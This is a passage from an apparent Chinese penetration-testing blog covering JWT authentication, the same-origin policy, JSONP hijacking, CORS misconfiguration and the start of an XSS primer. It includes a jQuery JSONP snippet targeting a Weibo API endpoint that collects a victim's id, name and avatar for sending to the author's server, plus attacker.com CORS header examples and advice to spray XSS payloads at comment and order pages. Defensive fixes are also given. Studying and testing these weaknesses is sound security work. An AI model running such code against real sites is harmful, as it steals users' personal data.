，如果验证成功，就向客户端返回请求的数据</li></ol><p><strong>特点：</strong></p><ul><li><strong>每一次请求都需要携带 token，需要把 token 放到 HTTP 的 Header 里</strong></li><li><strong>基于 token 的用户认证是一种服务端无状态的认证方式，服务端不用存放 token 数据。用解析 token 的计算时间换取 session 的存储空间，从而减轻服务器的压力，减少频繁的查询数据库</strong></li><li><strong>token 完全由应用管理，所以它可以避开同源策略</strong></li></ul><h2 id="jwt"><a class="markdownIt-Anchor" href="#jwt"></a> JWT</h2><p>JSON Web Token（简称 JWT）是目前最流行的<strong>跨域认证</strong>解决方案。</p><p>是一种<strong>认证授权机制</strong>。</p><p>JWT 是为了在网络应用环境间<strong>传递声明</strong>而执行的一种基于 JSON 的开放标准（<a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.ietf.org%2Fhtml%2Frfc7519">RFC 7519</a>）。JWT 的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源。比如用在用户登录上。</p><p>可以使用 HMAC 算法或者是 RSA 的公/私秘钥对 JWT 进行签名。因为数字签名的存在，这些传递的信息是可信的。</p><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/16f523a04e881087tplv-t2oaga2asx-zoom-in-crop-mark3024000.awebp" alt="img" style="zoom:80%;" /><p><strong>JWT 认证流程</strong>：</p><ul><li><p>用户输入用户名/密码登录，服务端认证成功后，会返回给客户端一个 JWT</p></li><li><p>客户端将 token 保存到本地（通常使用 localstorage，也可以使用 cookie）</p></li><li><p>当用户希望访问一个受保护的路由或者资源的时候，需要请求头的 Authorization 字段中使用Bearer 模式添加 JWT，其内容看起来是下面这样<code>Authorization: Bearer &lt;token&gt;</code></p></li><li><p>服务端的保护路由将会检查请求头 Authorization 中的 JWT 信息，如果合法，则允许用户的行为</p></li><li><p>因为 JWT 是自包含的（内部包含了一些会话信息），因此减少了需要查询数据库的需要</p></li><li><p>因为 JWT 并不使用 Cookie 的，所以你可以使用任何域名提供你的 API 服务而不需要担心跨域资源共享问题（CORS）</p></li><li><p>因为用户的状态不再存储在服务端的内存中，所以这是一种无状态的认证机制</p></li></ul><p><strong>JWT 的使用方式</strong></p><p>客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。</p><ul><li><p>方式一</p><ul><li><p>当用户希望访问一个受保护的路由或者资源的时候，可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求头信息的 Authorization 字段里，使用 Bearer 模式添加 JWT。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /calendar/v1/events</span><br><span class="line">Host: api.example.com</span><br><span class="line">Authorization: Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure><ul><li>用户的状态不会存储在服务端的内存中，这是一种 <strong>无状态的认证机制</strong></li><li>服务端的保护路由将会检查请求头 Authorization 中的 JWT 信息，如果合法，则允许用户的行为。</li><li>由于 JWT 是自包含的，因此减少了需要查询数据库的需要</li><li>JWT 的这些特性使得我们可以完全依赖其无状态的特性提供数据 API 服务，甚至是创建一个下载流服务。</li><li>因为 JWT 并不使用 Cookie ，所以你可以使用任何域名提供你的 API 服务而<strong>不需要担心跨域资源共享问题</strong>（CORS）</li></ul></li></ul></li><li><p>方式二</p><ul><li>跨域的时候，可以把 JWT 放在 POST 请求的数据体里。</li></ul></li><li><p>方式三</p><ul><li>通过 URL 传输：<a href="http://www.example.com/user?token=xxx">http://www.example.com/user?token=xxx</a></li></ul></li></ul><h2 id="常见的前后端鉴权方式"><a class="markdownIt-Anchor" href="#常见的前后端鉴权方式"></a> 常见的前后端鉴权方式</h2><ol><li>Session-Cookie</li><li>Token 验证（包括 JWT，SSO单点登录认证）</li><li>OAuth2.0（开放授权）</li></ol><h2 id="cookie-session和token的对比"><a class="markdownIt-Anchor" href="#cookie-session和token的对比"></a> Cookie 、Session和Token的对比</h2><table><thead><tr><th>属性</th><th>Cookie</th><th>Session</th><th>Token（JWT）</th></tr></thead><tbody><tr><td>安全性</td><td>差</td><td>-</td><td>好（不会有CORS劫持）</td></tr><tr><td>存储方式</td><td>由浏览器存储</td><td>由服务器存储</td><td>由应用管理</td></tr><tr><td>存储大小</td><td>小（且时间长）</td><td>理论无限大（时间短）</td><td>-</td></tr><tr><td>功能差异</td><td>1. 移动端支持差；2. <strong>无法跨域</strong></td><td>-</td><td>1. 移动端支持好</td></tr><tr><td>实现方式</td><td>存储与比对，<strong>会存储会话信息</strong></td><td>存储与比对，<strong>会存储会话信息</strong></td><td>直接解析比对，不依赖cookie，<strong>不会存储会话信息</strong></td></tr></tbody></table><h1 id="同源策略"><a class="markdownIt-Anchor" href="#同源策略"></a> 同源策略</h1><p>所谓的同源就是：<strong>协议+主机（域名）+端口</strong>都相同，一般来说，主机协议不一样，那么端口就不一样，就像http 80 https 443一样。</p><p>主要用来防止跨源操作，例如，读和写。</p><p>但是我们有时候需要引入外部资源，这个同源一棒子全部打死，咋办？</p><p>这时候有两种解决方式一个是JSONP，一个是CORS：</p><ol><li><p>一个是通过src标签属性来绕过检查</p></li><li><p>一个是通过双方验证允许的列表，来保证导入的数据是好的</p></li></ol><p>他们分别会导致不同的劫持。</p><p>同源判断示例：URL地址 <code>http://www.example.com/dir/page.html</code></p><table><thead><tr><th>Compared URL</th><th>Outcome</th><th>Reason</th></tr></thead><tbody><tr><td><a href="http://www.example.com/dir/page2.html">http://www.example.com/dir/page2.html</a></td><td>Success</td><td>Same protocol, host and port</td></tr><tr><td><a href="http://www.example.com/dir2/other.html">http://www.example.com/dir2/other.html</a></td><td>Success</td><td>Same protocol, host and port</td></tr><tr><td><a href="http://domain-ip/dir/page2.html">http://domain-ip/dir/page2.html</a></td><td>Failure</td><td>Different host (exact match required)</td></tr><tr><td><a href="http://username:password@www.example.com/dir2/other.html">http://username:password@www.example.com/dir2/other.html</a></td><td>Success</td><td>Same protocol, host and port</td></tr><tr><td><a href="http://www.example.com:81/dir/other.html">http://www.example.com:81/dir/other.html</a></td><td>Failure</td><td>Same protocol and host but different port</td></tr><tr><td><a href="https://www.example.com/dir/other.html">https://www.example.com/dir/other.html</a></td><td>Failure</td><td>Different protocol</td></tr><tr><td><a href="http://en.example.com/dir/other.html">http://en.example.com/dir/other.html</a></td><td>Failure</td><td>Different host</td></tr><tr><td><a href="http://example.com/dir/other.html">http://example.com/dir/other.html</a></td><td>Failure</td><td>Different host (exact match required)</td></tr><tr><td><a href="http://v2.www.example.com/dir/other.html">http://v2.www.example.com/dir/other.html</a></td><td>Failure</td><td>Different host (exact match required)</td></tr><tr><td><a href="http://www.example.com/dir/other.html">http://www.example.com:80/dir/other.html</a></td><td>Depends</td><td>Port explicit. Depends on implementation in browser</td></tr></tbody></table><h1 id="jsonp填充式-json"><a class="markdownIt-Anchor" href="#jsonp填充式-json"></a> JSONP——填充式 JSON</h1><p>JSONP 是 JSON with padding（填充式 JSON 或参数式 JSON）的简写。JSONP实现跨域请求的原理简单的说，就是动态创建<code>&lt;script&gt;</code>标签，然后利用<code>&lt;script&gt;</code>的src 不受同源策略约束来跨域获取数据。<strong>JSONP</strong> 就是为了跨域<strong>获取资源</strong>而产生的一种<strong>非官方</strong>的技术手段(官方的有 CORS 和 postMessage),它利用的是 script 标签的 src 属性不受同源策略影响的特性。</p><p>JSONP 由两部分组成：<strong>回调函数</strong>和<strong>数据</strong>。回调函数是当响应到来时应该在页面中调用的函数。回调函数的名字一般是在请求中指定的。而数据就是传入回调函数中的 JSON 数据。</p><p>动态创建<code>&lt;script&gt;</code>标签，设置其src，回调函数在src中设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var script = document.createElement(&quot;script&quot;);</span><br><span class="line">script.src = &quot;https://api.douban.com/v2/book/search?q=javascript&amp;count=1&amp;callback=handleResponse&quot;;</span><br><span class="line">document.body.insertBefore(script, document.body.firstChild);</span><br></pre></td></tr></table></figure><p>在页面中，返回的JSON作为response参数传入回调函数中，我们通过回调函数来来操作数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function handleResponse(response)&#123;</span><br><span class="line">    // 对response数据进行操作代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="劫持"><a class="markdownIt-Anchor" href="#劫持"></a> 劫持</h2><p>那么<strong>劫持</strong>又是怎么回事呢？其实我们在学安全的过程中对劫持这个词可以说是一点也不陌生，我们遇到过很多的劫持的攻击方法，比如：dns 劫持、点击劫持、cookie劫持等等，也正如劫持这个词的含义：“拦截挟持”，dns 劫持就是把 dns 的解析截获然后篡改，点击劫持就是截获你的鼠标的点击动作，在用户不知情的情况下点击攻击者指定的东西，cookie 劫持就是获取用户的 cookie，然后可以进一步伪造身份，那么同样， jsonp 劫持就是攻击者获取了本应该传给网站其他接口的数据。</p><h2 id="劫持利用过程"><a class="markdownIt-Anchor" href="#劫持利用过程"></a> 劫持利用过程</h2><p>通过JSONP技术可以实现数据的跨域访问，必然会产生安全问题。</p><blockquote><p>如果网站B对网站A的JSONP请求没有进行安全检查直接返回数据，则网站B 便存在JSONP 漏洞，网站A 利用JSONP漏洞能够获取用户在网站B上的数据。</p></blockquote><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/image-20230531102902509.png" alt="image-20230531102902509" style="zoom: 80%;" /><ol><li>用户在网站B 注册并登录，网站B 包含了用户的id，name，email等信息；</li><li>用户通过浏览器向网站A发出URL请求；</li><li>网站<strong>A向用户返回响应页面</strong>，响应页面中注册了JavaScript的回调函数和向网站B请求的script标签，示例代码如下：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function Callback(result)</span><br><span class="line">&#123;</span><br><span class="line">    alert(result.name);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://B.com/user?jsonp=Callback&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>用户收到响应，解析JS代码，将回调函数作为参数向网站B发出请求；</li><li>网站B接收到请求后，解析请求的URL，以JSON 格式生成请求需要的数据，将封装的包含用户信息的JSON数据作为回调函数的参数返回给浏览器，网站B返回的数据实例如下：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Callback(&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;test&quot;,&quot;email&quot;:&quot;test@test.com&quot;&#125;)。</span><br></pre></td></tr></table></figure><ol start="6"><li>网站B数据返回后，浏览器则自动执行Callback函数对步骤4返回的JSON格式数据进行处理，通过alert弹窗展示了用户在网站B的注册信息。另外也可将JSON数据回传到网站A的服务器，这样网站A利用网站B的JSONP漏洞便获取到了用户在网站B注册的信息。</li></ol><p><strong>实例：</strong></p><p>攻击者通过巧妙设计一个网站，<strong>网站中包含其他网站的JSONP漏洞利用代码</strong>，将链接通过邮件等形式推送给受害人，**如果受害者点击了链接，则攻击者便可以获取受害者的个人的信息，如邮箱、姓名、手机等信息，**这些信息可以被违法犯罪分子用作“精准诈骗”。对方掌握的个人信息越多，越容易取得受害人的信任，诈骗活动越容易成功，给受害人带来的财产损失以及社会危害也就越大。</p><h2 id="挖掘思路"><a class="markdownIt-Anchor" href="#挖掘思路"></a> 挖掘思路</h2><p>这里我采用chrome浏览器的调试窗口进行挖掘weibo.com中存在的漏洞(测试之前需要登录一下，因为我们需要检测是不是会有敏感信息泄露)</p><p>首先把Preserve log选项勾上，这样用来防止页面刷新跳转的时候访问记录被重置，也方便我们进行下一步的筛选。</p><p><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%952.png" alt="此处输入图片的描述" /></p><p>然后 F5 刷新，进入 NetWork 标签 ，CTRL+F 查找一些关键词 如 callback json jsonp email</p><p><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%953.png" alt="此处输入图片的描述" /></p><p>然后我们需要人工确认这个请求的返回值是否有泄露用户的敏感信息，并且能被不同的域的页面去请求获取，这里以上面查找到的 jsonp 为例，发现换成了别的浏览器还是能检测到，说明验证的来源有些问题</p><h2 id="自动化查找"><a class="markdownIt-Anchor" href="#自动化查找"></a> 自动化查找</h2><p>自动化测试工具Selenium + Proxy + 验证脚本</p><ol><li>Selenium：可用于自动化对网页进行测试，“到处”点击按钮、超链接，以期待测试更多的接口；</li><li>Proxy：用于代理所有的请求，过滤出所有包含敏感信息的JSONP请求，并记录下HTTP请求；</li><li>验证脚本：使用上述的HTTP请求，剔除referer字段，再次发出请求，测试返回结果中，是否仍包敏感信息，如果有敏感信息，说明这个接口就是我们要找的！</li></ol><h2 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h2><p>JSONP 漏洞主要被攻击者用来在受害者不知不觉中窃取他们的隐私数据，常常被一些 APT 组织采用进行信息收集和钓鱼的工作(<a href="https://www.freebuf.com/articles/web/70025.html">水坑攻击</a>)，下面的一个例子就可以说是在模拟水坑攻击</p><p>当我们发现信息泄露的 jsonp 接口以后我们要做的就是在自己的网站上写一个脚本，然后引诱受害者去访问这个网站，一旦访问了这个网站，脚本就会自动运行，就会想这个接口请求用户的敏感数据，并传送到攻击者的服务器上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url: &#x27;https://api.weibo.com/2/&#123;隐藏了哦&#125;&#x27;,</span><br><span class="line">    type: &#x27;get&#x27;,</span><br><span class="line">    dataType: &#x27;jsonp&#x27;,</span><br><span class="line">&#125;).done(function(json)&#123;</span><br><span class="line">    var id = json[&quot;data&quot;][&quot;id&quot;];</span><br><span class="line">    var screen_name = json[&quot;data&quot;][&quot;screen_name&quot;];</span><br><span class="line">    var profile_image_url = json[&quot;data&quot;][&quot;profile_image_url&quot;];</span><br><span class="line"></span><br><span class="line">    var post_data = &quot;&quot;;</span><br><span class="line">    post_data += &quot;id=&quot; + id + &quot;&amp;amp;&quot;;</span><br><span class="line">    post_data += &quot;screen_name=&quot; + screen_name + &quot;&amp;amp;&quot;;</span><br><span class="line">    post_data += &quot;profile_image_url=&quot; + encodeURIComponent(profile_image_url);</span><br><span class="line">    console.log(post_data);</span><br><span class="line">    // 发送到我的服务器上</span><br><span class="line">&#125;).fail(function() &#123;&#125;);</span><br></pre></td></tr></table></figure><p>利用代码：<a href="https://github.com/qiaofei32/jsonp_info_leak">https://github.com/qiaofei32/jsonp_info_leak</a></p><h2 id="防护"><a class="markdownIt-Anchor" href="#防护"></a> 防护</h2><ol><li>严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等。</li><li>严格按照 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）。</li><li>严格过滤 callback 函数名及 JSON 里数据的输出。</li><li>严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。</li><li>其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：/**/、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 早起使用 AJAX 的方式获取 JSON ，听过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用。</li></ol><h1 id="cors跨来源资源共享"><a class="markdownIt-Anchor" href="#cors跨来源资源共享"></a> CORS——跨来源资源共享</h1><p>CORS（Cross-Origin Resource Sharing 跨来源资源共享），CORS允许浏览器向跨域服务器发出XmlHttpRequest请求，CORS与JSONP的区别：是JSONP的升级版，JSONP只能通过get方式请求，CORS支持get和post请求。</p><p>CORS跨域原理：向header中注入Access-Control-Allow-Origin服务端过判断请求头中的参数是否被允许的域来决定请求源是否有权限获取数据。如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。</p><h2 id="字段"><a class="markdownIt-Anchor" href="#字段"></a> 字段</h2><ol><li><p>Access-Control-Allow-Origin：该字段是必须存在的，它的值可能是 Origin 字段的值或者是一个通配符“*”，表示可以接受任意域名的请求，当然大部分服务器如果配置了通配符的话，信息泄露的风险骤然加大；</p></li><li><p>Access-Control-Allow-Credentials</p><p>该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。但需要注意的是，如果要发送 cookie，Access-Control-Allow-Origin 就不能设为星号，必须明确指定与请求网页一致的域名，同时Cookie依然遵循同源策略， 只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。</p></li></ol><h2 id="简单流程"><a class="markdownIt-Anchor" href="#简单流程"></a> 简单流程</h2><p><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/1646812634466-fbf45f2a-b577-47b3-a809-cf238b1ff447.png" alt="img" /></p><p>这个响应头表示访问允许，*符号表示所有的请求源的所有形式的请求，都被允许访问数据，这样也就造成了一个跨域读取敏感信息的漏洞。</p><p><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/bVbEgb2.png" alt="image.png" /></p><p><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/bVbEgce.png" alt="image.png" /></p><p>改为百度成功,假如我改成自己服务器上的话,是不是在本机就能读取到别人的敏感信息呢?</p><h2 id="如何快速判断是否存在cors漏洞"><a class="markdownIt-Anchor" href="#如何快速判断是否存在cors漏洞"></a> 如何快速判断是否存在CORS漏洞</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">最好的攻击案例：</span><br><span class="line">Access-Control-Allow-Origin: https://attacker.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line"></span><br><span class="line">可能存在利用点：</span><br><span class="line">Access-Control-Allow-Origin: null</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line"></span><br><span class="line">配置失误，但是几乎无法利用：</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line"></span><br><span class="line">或者只有一个：</span><br><span class="line">Access-Control-Allow-Origin: *</span><br></pre></td></tr></table></figure><p><strong>修复建议：</strong><br />加强对access-control-allow-orign的控制；</p><p>另外提一下大平台很喜欢利用cors跨域读取资源，多多使用f12打法有奇效。<strong>总的来说jsonp劫持和cors跨域都是属于csrf漏洞的一种,需要诱骗受害者点击才能触发</strong>,就是返回信息的接口被攻击者调用了 返回了敏感数据给其他人。</p><h2 id="检测"><a class="markdownIt-Anchor" href="#检测"></a> 检测</h2><p>CORS 漏洞主要看当我们发起的请求中带有 Origin 头部字段时，服务器的返回包带有 CORS 的相关字段并且允许 Origin 的域访问。</p><p>一般测试WEB漏洞都会用上BurpSuite，而BurpSuite可以实现帮助我们检测这个漏洞。</p><p>首先是自动在 HTTP 请求包中加上 Origin 的头部字段，打开BurpSuite，选择 Proxy 模块中的 Options 选项，找到 Match and Replace 这一栏，勾选 Request header 将空替换为 Origin:foo.example.org 的Enable框：</p><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646820689476-f7b1ce2f-d25e-4c80-bd2d-645d84710c48.png" alt="img" /></p><p>然后我们就可以开始去访问我们认为有漏洞的网站，访问足够多后在 BurpSuite 的 Proxy 模块下的 HTTP history 来筛选带有 CORS 头部的值：</p><p><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/1646820729340-d1b5d3f7-608b-4b9c-9601-e143470bb344.png" alt="img" /></p><p>条件可以是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: foo.example.org</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure><p>这里要注意的是，我们也可以测试下带有 CORS 字段的网站是否有 CORS 漏洞，如果服务器响应包的请求头是以下几种情况则可存在 CORS 漏洞</p><ol><li><p>一定有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">或</span><br><span class="line">Access-Control-Allow-Origin: https://attacker.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure></li><li><p>可能：（同时出现）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: null</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure></li><li><p>没有：(浏览器会自动截至)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure></li></ol><p>有时候 CORS 配置了信任自身的任意子域，那么如果一个子域存在 XSS 漏洞就可以通过这个漏洞去读取其他子域的资源，类似的场景还有比如 HTTPS 域信任 HTTP 域等。</p><h2 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h2><ol><li><a href="https://github.com/chenjj/CORScanner%E3%80%82">https://github.com/chenjj/CORScanner。</a></li><li>详细说明+payload <a href="https://github.com/AI0TSec/blog/issues/9">https://github.com/AI0TSec/blog/issues/9</a></li></ol><h2 id="防护-2"><a class="markdownIt-Anchor" href="#防护-2"></a> 防护</h2><ol><li>关闭不必要开启的CORS；</li><li>白名单限制：定义“源”的白名单，避免使用正则表达式，不要配置 Access-Control-Allow-Origin 为通配符 * 或 null ，严格效验来自请求数据包中的 Origin 的值；</li><li>仅允许使用安全协议，避免中间人攻击；</li><li>尽可能的返回 Vary: Origin 头部，以避免攻击者利用浏览器缓存进行攻击；</li><li>避免将 Access-Control-Allow-Credentials 标头设置为默认值 true ，跨域请求若不存在必要的凭证数据，则根据实际情况将其设置为 false；</li><li>限制跨域请求允许的方法，Access-Control-Allow-Methods 最大限度地减少所涉及的方法，降低风险；</li><li>限制浏览器缓存期限：建议通过 Access-Control-Allow-Methods 和 Access-Control-Allow-Headers 头部，限制浏览器缓存信息的时间。通过配置 Access-Control-Max-Age 标头来完成，该头部接收时间数作为输入，该数字是浏览器保存缓存的时间。配置相对较低的值，确保浏览器在短时间内可以更新策略；</li><li>仅在接收到跨域请求时才配置有关于跨域的头部，并确保跨域请求是合法的源，以减少攻击者恶意利用的可能性。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;认证-授权与凭证的概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#认证-授权与凭证的概念&quot;&gt;&lt;/a&gt; 认证、授权与凭证的概念&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;认证&lt;/strong&gt;：&lt;strong&gt;验证当前用户的身份&lt;/strong</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="XSS" scheme="https://j3f5.github.io/tags/XSS/"/>
    
    <category term="CSRF" scheme="https://j3f5.github.io/tags/CSRF/"/>
    
    <category term="劫持" scheme="https://j3f5.github.io/tags/%E5%8A%AB%E6%8C%81/"/>
    
    <category term="跨域" scheme="https://j3f5.github.io/tags/%E8%B7%A8%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>XSS跨站基础</title>
    <link href="https://j3f5.github.io/articles/2023/05/30/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/"/>
    <id>https://j3f5.github.io/articles/2023/05/30/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/</id>
    <published>2023-05-30T08:40:42.000Z</published>
    <updated>2023-06-01T03:09:45.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss跨站基础"><a class="markdownIt-Anchor" href="#xss跨站基础"></a> XSS跨站基础</h1><h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><p>恶意攻击者在web页面中会插入一些恶意的javascript代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。</p><p><strong>层面</strong>：一般都是在前端，<strong>JavaScript代码能干什么，执行之后就会达到相应的效果</strong></p><p><strong>函数</strong>：比如说php中的脚本的输出函数：常见的输出函数有：<strong>print、print_r、echo、printf、sprintf、die、var_dump、var_export</strong></p><img src="/images/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASXNlY05vb2I=,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述" style="zoom:80%;" /><h2 id="危害影响"><a class="markdownIt-Anchor" href="#危害影响"></a> 危害影响</h2><p>攻击者通过Web应用程序发送恶意代码，一般以浏览器脚本的形式发送给不同的终端用户。当一个Web程序的用户输入点没有进行校验和编码，将很容易的导致XSS。</p><ul><li>网络钓鱼，包括获取各类用户账号；</li><li>窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作；</li><li>劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、电子邮件等；</li><li>强制弹出广告页面、刷流量等；</li><li>网页挂马；</li><li>进行恶意操作，如任意篡改页面信息、删除文章等；</li><li>进行大量的客户端攻击，如ddos等；</li><li>获取客户端信息，如用户的浏览历史、真实ip、开放端口等；</li><li>控制受害者机器向其他网站发起攻击；</li><li>结合其他漏洞，如csrf,实施进一步危害；</li><li>提升用户权限，包括进一步渗透网站；</li><li>传播跨站脚本蠕虫等</li></ul><p>注意：浏览器的内核会影响攻击的产生（会阻止），所以，XSS的危害会受到很多因素的影响。</p><p>攻击成功的条件：<strong>对方有漏洞，浏览器存有cookie，浏览器不进行拦截，不存在带代码过滤和httponly，对方要触发这个漏洞地址</strong></p><h2 id="出现位置"><a class="markdownIt-Anchor" href="#出现位置"></a> 出现位置</h2><p>文章发表、评论、留言、注册资料、修改资料等地方</p><h3 id="什么位置是有用的"><a class="markdownIt-Anchor" href="#什么位置是有用的"></a> 什么位置是有用的？</h3><p>一般XSS漏洞，厂家是不收的，因为有很多的限制条件，但是我们如果在订单发布等地方发现了XSS存储型漏洞，那么这个漏洞是很有价值的。因为管理员会经常访问订单页面查看，不需要我们去发链接给他触发。</p><p>重点位置：</p><ul><li>留言板</li><li>评论区</li><li>订单系统</li><li>反馈信息</li></ul><h3 id="测试手法"><a class="markdownIt-Anchor" href="#测试手法"></a> 测试手法</h3><p>盲打，直接冲，乱甩payload。注意，这个位置必须是上面的位置！</p><h2 id="攻击类型分类"><a class="markdownIt-Anchor" href="#攻击类型分类"></a> 攻击类型分类</h2><p>反射型：发包 =&gt; x.php =&gt; 回包</p><p>存储型：发包 =&gt; x.php =&gt; 数据库 =&gt; 回包</p><p>DOM型：发包 =&gt; 本地浏览器静态前端代码 =&gt; x.php</p><h3 id="反射型"><a class="markdownIt-Anchor" href="#反射型"></a> 